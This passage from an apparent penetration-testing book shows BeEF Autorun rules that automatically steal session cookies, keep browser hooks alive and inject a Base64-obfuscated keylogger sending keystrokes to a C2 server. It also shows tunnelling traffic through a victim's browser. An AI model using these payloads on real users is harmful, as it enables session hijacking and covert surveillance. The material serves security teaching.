class="inner"><h3 class="title"><a id="note54"/>Note</h3><p>More <a id="id479" class="indexterm"/>information on ARE can be found at <a class="ulink" href="https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine">https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine</a>.</p></div></div><p>An ARE rule is a simple JSON file with metadata describing the module that is to be executed, stored in BeEF's <code class="literal">arerules</code> subdirectory.</p><p>BeEF comes with a few sample rules that allow you to execute modules such as Get Cookie or Ping Sweep, but they are not turned on by default. If we wish to execute them as soon as the victim is hooked, we have to place the respective JSON files inside the <code class="literal">arerules/enabled</code> subdirectory and restart BeEF.</p><p>The Get Cookie ARE rule looks like this:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# cat <span class="strong"><strong>arerules/get_cookie.json</strong></span> 
{
  "name": "<span class="strong"><strong>Get Cookie</strong></span>",
  "author": "@benichmt1",
  "browser": "ALL",
  "browser_version": "ALL",
  "os": "ALL",
  "os_version": "ALL",
  "modules": [
    {"name": "<span class="strong"><strong>get_cookie</strong></span>",
      "condition": null,
      "<span class="strong"><strong>options</strong></span>": {
      }
    }
  ],
  "execution_order": [0],
  "execution_delay": [0],
  "chain_mode": "sequential"
}</pre></div><p>There's some metadata, such<a id="id480" class="indexterm"/> as <code class="literal">name</code> and <code class="literal">author</code>. The ARE rule can also specify any associated options it may need to execute successfully. We can define an execution order and also add a delay. The rule chaining modes refers to the method used to run the module, but the default sequence should work just fine in most deployments.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note55"/>Note</h3><p>More information on chaining modes and writing ARE can be found at <a class="ulink" href="https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine">https://github.com/beefproject/beef/wiki/Autorun-Rule-Engine</a>.</p></div></div><p>In our scenario, we are executing our hook using a reflected XSS attack, which means that as soon as the user clicks away from the page, we may lose them forever. This is where ARE comes in handy. We can automatically execute the Man-In-The-Browser and Get Cookie modules as soon as the victim comes online and hope that we can persist, or at least get the session cookie, before they leave.</p><p>Man-In-The-Browser and Get Cookie both have rules already available in BeEF; we just have to enable them by placing a copy of the proper JSON files in the <code class="literal">arerules/enabled</code> subdirectory:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# cp arerules/man_in_the_browser.json <span class="strong"><strong>arerules/enabled/man_in_the_browser.json</strong></span>
root@spider-c2-1:~/beef# cp arerules/get_cookie.json <span class="strong"><strong>arerules/enabled/get_cookie.json</strong></span>
</pre></div><p>For the ARE to load the newly enabled rules, we'd have to restart BeEF if it is already running:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# ./beef
[...]
[18:07:19][*] RESTful API key: cefce9633f9436202c1705908d508d31c7072374
[18:07:19][*] HTTP Proxy: http://127.0.0.1:6789
<span class="strong"><strong>[18:07:19][*] [ARE] Ruleset (Perform Man-In-The-Browser) parsed and stored successfully.</strong></span>
<span class="strong"><strong>[18:07:19][*] [ARE] Ruleset (Get Cookie) parsed and stored successfully.</strong></span>
[18:07:19][*] BeEF server started (press control+c to stop)</pre></div><p>BeEF will perform an MITB attack and extract the application cookies as soon as the victim visits the infected page. The Man-In-The-Browser module will keep the hook alive if the victim decides to click around the application. The Get Cookie module will hopefully exfiltrate session cookies in case they decide to close the browser altogether.</p><p>As you may have guessed, we<a id="id481" class="indexterm"/> can also automatically run the Raw Javascript module, which will allow us to execute arbitrary JavaScript as soon as a hooked browser comes online. A good candidate for this is our custom keylogger.</p><p>First, we have to create a rule that will instruct BeEF to execute the <code class="literal">raw_javascript</code> module:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# cat <span class="strong"><strong>arerules/enabled/raw_javascript.json</strong></span>
{ 
  "name": "Raw JavaScript",
  "author": "wade@bindshell.net",
  "browser": "ALL",
  "browser_version": "ALL",
  "os": "ALL",
  "os_version": "ALL",
  "modules": [
    {"name": "<span class="strong"><strong>raw_javascript</strong></span>",
      "condition": null,
      "options": {
         <span class="strong"><strong>"cmd": ""</strong></span>
      }
    }
  ],
  "execution_order": [0],
  "execution_delay": [0],
  "chain_mode": "sequential"
}</pre></div><p>We don't want to impose any conditions on running this rule, but we do have to specify a payload for execution. The <code class="literal">raw_javascript</code> module takes one option, <code class="literal">cmd</code>, which is the raw JavaScript code to execute.</p><p>Now, because the rule is in JSON format, we will Base64-encode our keylogger code, and pass it to a Base64 decoder, which in turn will be executed by an <code class="literal">eval()</code> function. We don't have to do this particular step, but to store the keylogger code in the JSON file, we'd have to compress it using a JavaScript minifier and escape any double quotes within the code. This is a bit messy, so we'll take the simpler route.</p><p>We can quickly encode the<a id="id482" class="indexterm"/> keylogger using something like CyberChef (or JavaScript's <code class="literal">btoa()</code> function):</p><div class="mediaobject"><img src="graphics/B09238_09_17.jpg" alt="Automatic exploitation"/><div class="caption"><p>Figure 9.17: CyberChef Base64-encoding the custom keylogger code</p></div></div><p>To run the Base64-encoded keylogger code, we have to pass it to <code class="literal">atob()</code>, JavaScript's Base64 decoder, before using <code class="literal">eval()</code> to actually execute the code.</p><p>The Raw JavaScript command input will look something like this:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>eval</strong></span>(<span class="strong"><strong>atob</strong></span>('dmFyIHB1c2hfdXJsID0gImh0dHA6Ly9jMi5zcGlkZXIubWwvbG9nLnBocD9zZXNzaW9uPSI7Cgp2YXIgYnVmZmVyID0gW107CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihlKSB7CiAgICBrZXkgPSBlLmtleTsKICAgIGlmIChrZXkubGVuZ3RoID4gMSB8fCBrZXkgPT0gIiAiKSB7IGtleSA9ICJbIiArIGtleSArICJdIiB9CiAgICBidWZmZXIucHVzaChrZXkpOwp9KTsKCndpbmRvdy5zZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGlmIChidWZmZXIubGVuZ3RoID4gMCkgewogICAgICAgIHZhciBkYXRhID0gZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoYnVmZmVyLmpvaW4oJycpKSk7CgogICAgICAgIHZhciBpbWcgPSBuZXcgSW1hZ2UoKTsKICAgICAgICBpbWcuc3JjID0gcHVzaF91cmwgKyBkYXRhOwoKICAgICAgICBidWZmZXIgPSBbXTsKICAgIH0KfSwgMjAwMCk7'));</pre></div><p>Finally, we can add this value to our Raw JavaScript ARE rule JSON file. This particular module expects a <code class="literal">cmd</code> option to be set, and this is where we put our one-liner.</p><p>The final rule will look <a id="id483" class="indexterm"/>like this:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# cat <span class="strong"><strong>arerules/enabled/raw_javascript.json</strong></span>
{ 
  "name": "Raw JavaScript",
  "author": "wade@bindshell.net",
  "browser": "ALL",
  "browser_version": "ALL",
  "os": "ALL",
  "os_version": "ALL",
  "modules": [
    {"name": "<span class="strong"><strong>raw_javascript</strong></span>",
      "condition": null,
      "<span class="strong"><strong>options</strong></span>": {
        "cmd": <span class="strong"><strong>"eval(atob('dmFyIHB1c2hfdXJsID0gImh0dHA6Ly9jMi5zcGlkZXIubWwvbG9nLnBocD9zZXNzaW9uPSI7Cgp2YXIgYnVmZmVyID0gW107CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihlKSB7CiAgICBrZXkgPSBlLmtleTsKICAgIGlmIChrZXkubGVuZ3RoID4gMSB8fCBrZXkgPT0gIiAiKSB7IGtleSA9ICJbIiArIGtleSArICJdIiB9CiAgICBidWZmZXIucHVzaChrZXkpOwp9KTsKCndpbmRvdy5zZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGlmIChidWZmZXIubGVuZ3RoID4gMCkgewogICAgICAgIHZhciBkYXRhID0gZW5jb2RlVVJJQ29tcG9uZW50KGJ0b2EoYnVmZmVyLmpvaW4oJycpKSk7CgogICAgICAgIHZhciBpbWcgPSBuZXcgSW1hZ2UoKTsKICAgICAgICBpbWcuc3JjID0gcHVzaF91cmwgKyBkYXRhOwoKICAgICAgICBidWZmZXIgPSBbXTsKICAgIH0KfSwgMjAwMCk7'));"</strong></span>
      }
    }
  ],
  "execution_order": [0],
  "execution_delay": [0],
  "chain_mode": "sequential"
}</pre></div><p>Each module will require its own specific options to run properly. BeEF is an open-source software, so we can inspect the code to figure out what these options are:</p><div class="mediaobject"><img src="graphics/B09238_09_18.jpg" alt="Automatic exploitation"/><div class="caption"><p>Figure 9.18: BeEF GitHub source code</p></div></div><p>Restarting BeEF will load our<a id="id484" class="indexterm"/> new ARE rule alongside the other two canned rules:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# ./beef
[...]
[18:07:19][*] RESTful API key: cefce9633f9436202c1705908d508d31c7072374
[18:07:19][*] HTTP Proxy: http://127.0.0.1:6789
[18:07:19][*] [ARE] Ruleset (Perform Man-In-The-Browser) parsed and stored successfully.
[18:07:19][*] [ARE] Ruleset (Get Cookie) parsed and stored successfully.
<span class="strong"><strong>[18:07:19][*] [ARE] Ruleset (Raw JavaScript) parsed and stored successfully.</strong></span>
[18:07:19][*] BeEF server started (press control+c to stop)</pre></div><p>All new hooked victims will have their cookies exfiltrated, a custom keylogger executed, and persistence enabled via the MITB attack.</p></div><div class="section" title="Tunneling traffic"><div class="titlepage"><div><div><h2 class="title"><a id="ch09lvl2sec43"/>Tunneling traffic</h2></div></div></div><p>Perhaps the coolest feature in <a id="id485" class="indexterm"/>BeEF is the ability to tunnel your traffic through the hooked victim's browser. BeEF will set up a local proxy that will forward web requests through the C2 and back out to the victim.</p><p>On the client-side, traffic forwarding is done using XHR, and therefore, requests are subject to SOP. This essentially limits us to the hooked domain. While this is not ideal, there are still some practical applications.</p><p>Consider a scenario where <a id="id486" class="indexterm"/>an internal admin interface is vulnerable to an XSS attack. We can't access it directly because it lives in a separate network segment, but we did successfully trick the administrator into executing our hook payload and now we have control over their session in BeEF. We wouldn't be able to read the contents of the administrator's Gmail account, but thanks to JavaScript, we could browse the admin interface just fine. What's more, we'd be authenticated as the victim automatically, thanks to the browser passing along cookies with every request.</p><p>Tunneling traffic is easy; we just right-click on a hooked client and select <span class="strong"><strong>Use as Proxy</strong></span>:</p><div class="mediaobject"><img src="graphics/B09238_09_19.jpg" alt="Tunneling traffic"/><div class="caption"><p>Figure 9.19: Using a victim as a proxy</p></div></div><p>When BeEF starts, it also runs a proxy service on the localhost, which will route traffic through the hooked victim's browsers if enabled:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~/beef# ./beef
[...]
[18:07:19][*] RESTful API key: cefce9633f9436202c1705908d508d31c7072374
[18:07:19][*] HTTP Proxy: <span class="strong"><strong>http://127.0.0.1:6789</strong></span>
</pre></div><p>We can see this traffic proxy in action by using <code class="literal">curl</code> and specifying the default BeEF proxy service (<code class="literal">127.0.0.1:6789</code>) using the <code class="literal">-x</code> parameter:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# curl -x 127.0.0.1:6789 http://<span class="strong"><strong>badguys.local</strong></span>
&lt;!DOCTYPE html&gt;
[...]

  &lt;title&gt;<span class="strong"><strong>Shiny, Let's Be Bad Guys</strong></span>: Exploiting and Mitigating the Top 10 Web App Vulnerabilities&lt;/title&gt;

[...]
&lt;/html&gt;
root@spider-c2-1:~#</pre></div><p>Not only were we able to<a id="id487" class="indexterm"/> browse the <code class="literal">badguys.local</code> domain, but we also did it from our C2 server in the cloud. Name resolution and packet routing is not a problem for the attacker, thanks to our malicious code running inside the victim's browser.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note56"/>Note</h3><p>Remember that SOP applies when tunneling traffic as well. We can send requests to arbitrary domains and ports, but we cannot read the contents of the response:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# curl -x 127.0.0.1:6789 <span class="strong"><strong>http://example.com</strong></span>
<span class="strong"><strong>ERROR: Cross Domain Request. The request was sent howev</strong></span>
<span class="strong"><strong>er it is impossible to view the response.</strong></span>
root@spider-c2-1:~#</pre></div></div></div></div></div>
<div class="section" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="ch09lvl1sec57"/>Summary</h1></div></div></div><p>In this chapter, we covered lots of information relating to client-side attacks. We looked at the three more common types of XSS: reflected, stored, and DOM, as well as CSRF, and chaining these attacks together. We also covered the SOP and how it affects loading third-party content or attack code onto the page.</p><p>The chapter showcased the built-in BeEF keylogger and even showed how to create your own. Using social engineering, we were able to trick the user into executing malicious code, giving us reverse shell access to the client's machine. Persistence is a real problem with XSS in particular, but using MITB attacks, we managed to extend our foothold on the client. Finally, we explored automating exploitation with BeEF's ARE and we even tunneled HTTP traffic through a victim's browser.</p><p>The purpose of this chapter was to show that client-side attacks can be practical in a real-world attack. Even though we are not executing native code, XSS and CSRF attacks can be combined to do some real damage to targets. In the next chapter, we will switch gears from attacking users to attacking the server itself, by way of XML.</p></div></body></html>